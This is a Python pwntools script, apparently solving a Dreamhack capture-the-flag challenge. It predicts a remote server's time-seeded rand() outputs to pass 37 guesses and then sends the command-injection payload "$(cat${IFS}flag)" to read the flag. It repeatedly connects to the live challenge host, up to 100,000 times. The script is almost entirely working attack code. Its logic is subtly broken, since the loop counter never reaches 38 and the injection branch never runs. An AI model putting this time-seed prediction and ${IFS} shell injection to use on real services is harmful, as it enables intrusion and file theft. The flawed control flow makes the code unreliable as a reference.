from pwn import *
from ctypes import *
from time import *

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

key = []

context.log_level = 'debug'
#context.log_level = 'info'

LOCALHOST = "host3.dreamhack.games"
NUMBER = 8753
i=0
Max = 0
trial = []

for test in range(1, 100001):
	p=remote(LOCALHOST, NUMBER)
	libc.srand(libc.time(0))
	i=0

	"""
	#read all and input all
	for i in range(0, 37):
		key.append('l' if libc.rand()%2 == 0 else 'h')
		libc.rand()

	try:
		for i in range(len(key)):
			p.recvuntil(b':')
			p.recvuntil(b' ')		# read until ' '
			p.sendline(key[i])
	finally:
		print(f"erro on {i}")
	"""
	
	#read one and input one 37times
	for i in range(1, 38):
		try:
			p.recvuntil(b':')
			p.recvuntil(b' ')
			p.sendline('l' if libc.rand()%2==0 else 'h')
			libc.rand()
		#trial fail
		except:
			print(f"{test}:error on {i} try")
			if i>Max: Max = i
			p.close()
			break
	#37times correct
	if i==38:
		p.recvuntil(b':')
		p.recvuntil(b' ')
		p.sendline("$(cat${IFS}flag)")
		flag = []
		#get all info
		try:
			while True:
				flag.append(p.recvline())
		finally:
			print(flag)
			p.close()
			break
	
	print(f"""
	====================================================
		Test : {test}		Max : {Max}		Now : {i-1}
	====================================================
	""")
	trial.append(i-1)
	
print(trial)

		
		
